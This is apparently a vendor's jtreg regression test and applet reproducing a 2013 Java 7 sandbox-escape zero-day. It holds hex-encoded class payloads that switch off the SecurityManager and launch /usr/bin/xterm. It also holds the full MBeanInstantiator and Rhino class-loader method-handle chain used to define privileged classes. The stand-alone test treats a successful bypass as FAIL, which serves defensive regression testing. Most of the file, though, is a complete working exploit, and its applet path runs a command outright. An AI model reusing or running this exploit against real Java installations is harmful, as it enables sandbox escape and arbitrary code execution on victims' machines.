/**
 * 894172 is real id, but jtreg needs 7 numbers bugs.... Howewer, trick with zero works....
 * dont forget to include 0894172 as whole bug id
 *
 * @test
 * @modules java.management/com.sun.jmx.mbeanserver
 * @bug 0894172
 * @summary sandbox bypas by MozJSCLTest
 * @author probably thoger
 * @requires jdk.version.major >= 7
 * @run main/othervm MozJSCLTest
 */

/* Java 7 0day exploit January 2013
 *
 * !! Red Hat Confidential !!
 *
 * This can be used as both stand-alone test case as well as applet for use
 * with appletviewer, Oracle or IcedTea-Web plugin
 *
 * Based on:
 * http://pastebin.com/raw.php?i=cUG2ayjh
 *
 * no need to run with  -Djava.security.manager as it isntalls its own SM anyway. See line 200
 */


import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.JmxMBeanServerBuilder;
import com.sun.jmx.mbeanserver.MBeanInstantiator;

import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;

import java.io.InputStreamReader;
import java.io.BufferedReader;

import java.security.AccessControlException;

import java.applet.Applet;
import java.awt.TextArea;


public class MozJSCLTest extends Applet {

	/* Payload that disables security manager:
	 * http://www.reddit.com/r/netsec/comments/16b4n1/0day_exploit_fo_java_17u10_spotted_in_the_wild/c7ulpd7

import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

public class B
	implements PrivilegedExceptionAction
{
	public B()
	{
		try
		{
			AccessController.doPrivileged(this);
		}
		catch(Exception e) { }
	}

	public Object run()
	{
		System.setSecurityManager(null);
		return new Object();
	}
}
	 */
	private static String payloadSecOff = "CAFEBABE0000003200220A000500130A001400150700160A0017001807001907001A07001B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C6501000D537461636B4D61705461626C6507001A07001601000372756E01001428294C6A6176612F6C616E672F4F626A6563743B01000A536F7572636546696C65010006422E6A6176610C0008000907001C0C001D001E0100136A6176612F6C616E672F457863657074696F6E07001F0C002000210100106A6176612F6C616E672F4F626A656374010001420100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01001273657453656375726974794D616E6167657201001E284C6A6176612F6C616E672F53656375726974794D616E616765723B295600210006000500010007000000020001000800090001000A00000050000100020000000E2AB700012AB8000257A700044CB1000100040009000C00030002000B000000120004000000090004000C0009000E000D000F000C000000100002FF000C000107000D000107000E000001000F00100001000A00000028000200010000000C01B80004BB000559B70001B000000001000B0000000A0002000000130004001400010011000000020012";


	/* Payload to run command (/usr/bin/xterm)

import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

public class C
	implements PrivilegedExceptionAction
{
	public C()
	{
		try
		{
			AccessController.doPrivileged(this);
		}
		catch(Exception e) { }
	}

	public Object run()
	{
		try
		{
			Runtime.getRuntime().exec("/usr/bin/xterm");
		}
		catch(Exception e) { }
		return new Object();
	}
}
	 */
	private static String payloadExec = "CAFEBABE0000003200280A000700150A001600170700180A0019001A08001B0A0019001C07001D07001E07001F0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C6501000D537461636B4D61705461626C6507001E07001801000372756E01001428294C6A6176612F6C616E672F4F626A6563743B01000A536F7572636546696C65010006432E6A6176610C000A000B0700200C002100220100136A6176612F6C616E672F457863657074696F6E0700230C0024002501000E2F7573722F62696E2F787465726D0C002600270100106A6176612F6C616E672F4F626A656374010001430100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B00210008000700010009000000020001000A000B0001000C00000050000100020000000E2AB700012AB8000257A700044CB1000100040009000C00030002000D000000120004000000090004000C0009000E000D000F000E000000100002FF000C000107000F0001070010000001001100120001000C0000004A0002000200000015B800041205B6000657A700044CBB000759B70001B0000100000009000C00030002000D0000000E00030000001500090017000D0018000E0000000700024C0700100000010013000000020014";


	private static byte[] hex2Byte(String paramString) {
		byte[] arrayOfByte = new byte[paramString.length() / 2];
		for (int i = 0; i < arrayOfByte.length; i++) {      
			arrayOfByte[i] = (byte)Integer.parseInt(paramString.substring(2 * i, 2 * i + 2), 16);    
		}
		return arrayOfByte;
	}


	private static int runproc(Process proc) throws Exception {
		BufferedReader cmdout = new BufferedReader(new InputStreamReader(proc.getInputStream()));
		String line;
		while ((line = cmdout.readLine()) != null) {
	    		System.out.println(line);
		}
		proc.waitFor();
		return proc.exitValue();
	}


	private static Class findClass(MBeanInstantiator mbeanInst, String name) {
		String[] prefixes = new String[] {
			"sun.org.mozilla.javascript.internal.",   // Oracle JDK
			"sun.org.mozilla.javascript."             // OpenJDK
		};

		for (String p: prefixes) {
			try {
				Class cl = mbeanInst.findClass(p + name, (ClassLoader)null);
				System.out.println("[i] Using class: " + p + name);
				return cl;
			} catch (Throwable ex) { }
		}

		return null;
	}


	private static void runPrivileged(String payloadClassBlob) throws Throwable {
		byte[] payloadClass = hex2Byte(payloadClassBlob);

		JmxMBeanServerBuilder mbeanSBuilder = new JmxMBeanServerBuilder();
		JmxMBeanServer mbeanServer = (JmxMBeanServer)mbeanSBuilder.newMBeanServer("", null, null);
		MBeanInstantiator mbeanInst = mbeanServer.getMBeanInstantiator();

		Class mozjsClContext = findClass(mbeanInst, "Context");
		Class mozjsClGeneratedClassLoader = findClass(mbeanInst, "GeneratedClassLoader");
		if (mozjsClContext == null  ||  mozjsClGeneratedClassLoader == null) {
			System.out.println("[!] Failed to find mozilla.javascript classes.");
			throw new Throwable("Failed to find mozilla.javascript classes.");
		}


		MethodHandles.Lookup mhLookup = MethodHandles.publicLookup();


		MethodType mt1 = MethodType.methodType(MethodHandle.class, Class.class, new Class[] { MethodType.class });
		MethodHandle findConstructorMH = mhLookup.findVirtual(MethodHandles.Lookup.class, "findConstructor", mt1);

		MethodType mt2 = MethodType.methodType(Void.TYPE);
		MethodHandle mozjsContextConstructorMH =
			(MethodHandle)findConstructorMH.invokeWithArguments(new Object[] { mhLookup, mozjsClContext, mt2 });

		Object mozjsContext = mozjsContextConstructorMH.invokeWithArguments(new Object[0]);


		MethodType mt3 = MethodType.methodType(MethodHandle.class, Class.class, new Class[] { String.class, MethodType.class });
		MethodHandle findVirtualMH = mhLookup.findVirtual(MethodHandles.Lookup.class, "findVirtual", mt3);

		MethodType mt4 = MethodType.methodType(mozjsClGeneratedClassLoader, ClassLoader.class);
		MethodHandle mozjsGeneratedClassLoaderMH =
			(MethodHandle)findVirtualMH.invokeWithArguments(new Object[] { mhLookup, mozjsClContext, "createClassLoader", mt4 });

		Object mozjsGeneratedClassLoader = mozjsGeneratedClassLoaderMH.invokeWithArguments(new Object[] { mozjsContext, null });


		MethodType mt5 = MethodType.methodType(Class.class, String.class, new Class[] { byte[].class });
		MethodHandle defineClassMH =
			(MethodHandle)findVirtualMH.invokeWithArguments(new Object[] { mhLookup, mozjsClGeneratedClassLoader, "defineClass", mt5 });

		Class payload = (Class)defineClassMH.invokeWithArguments(new Object[] { mozjsGeneratedClassLoader, null, payloadClass });
		payload.newInstance();
	}


	// stand-alone test
	public static void main(String[] args) {
		String cmd = "/bin/date";

		if (args.length != 0) {
			cmd = args[0];
		}

		System.out.println("[i] Using Java: " + System.getProperty("java.vendor") + ", " + System.getProperty("java.version"));

		// make sure this runs sandboxed
		if (System.getSecurityManager() == null) {
			System.setSecurityManager(new SecurityManager());
			System.out.println("[i] Installed SecurityManager.");
		}

		// sanity check
		try {
			runproc(Runtime.getRuntime().exec(cmd));
			System.out.println("[-] Test error, command was run.");
			return;
		} catch (AccessControlException e) {
			System.out.println("[i] Sandbox check passed, unable to run command directly.");
		} catch (Throwable e) {
			System.out.println("[!] Unexpected error:");
			e.printStackTrace();
			return;
		}

		// disable SM
		try {
			runPrivileged(payloadSecOff);
		} catch (Throwable e) {
			System.out.println("[i] Failed to execute payload: " + e.toString());
		}

		if (System.getSecurityManager() == null) {
			System.out.println("[i] SecurityManager is now disabled.");
		} else {
			System.out.println("[i] SecurityManager is still enabled.");
		}

		// execute command
		System.out.println("[i] Running command: " + cmd);
		try {
			runproc(Runtime.getRuntime().exec(cmd));
			System.out.println("FAIL - command was executed");
            System.exit(1);
		} catch (AccessControlException e) {
			System.out.println("PASS - failed to run command: " + e.getMessage());
		} catch (Throwable e) {
			System.out.println("FAIL - unexpected exception:");
			e.printStackTrace();
            System.exit(1);
		}
	}


	// applet test
	public void init() {
		TextArea ta = new TextArea("", 15, 90);
		this.add(ta);

		ta.append("Using Java: " + System.getProperty("java.vendor") + ", " + System.getProperty("java.version") + "\n");

		// try disabling SM
		try {
			runPrivileged(payloadSecOff);
		} catch (Throwable e) {
			ta.append("Failed to execute payload to disable SecurityManager:\n" + e.toString() + "\n");
			for (StackTraceElement ste: e.getStackTrace()) {
				ta.append("        at " + ste.toString() + "\n");
			}
		}

		if (System.getSecurityManager() == null) {
			// this is expected with oracle plugin or appletviewer
			ta.append("SecurityManager is now DISABLED.\n");

			// execute command
			try {
				Runtime.getRuntime().exec("/usr/bin/xterm");
				ta.append("xterm should now be running.\n");
			} catch (Throwable e) {
				ta.append("Command execution failed with: " + e.toString());
			}

		} else {
			// this is expected with icedtea-web
			ta.append("SecurityManager is still ENABLED.\n");

			// try command execution payload
			try {
				runPrivileged(payloadExec);
				ta.append("xterm should now be running.\n");
			} catch (Throwable e) {
				ta.append("Failed to execute command execution payload:\n" + e.toString() + "\n");
				for (StackTraceElement ste: e.getStackTrace()) {
					ta.append("        at " + ste.toString() + "\n");
				}
			}
		}
	}
}
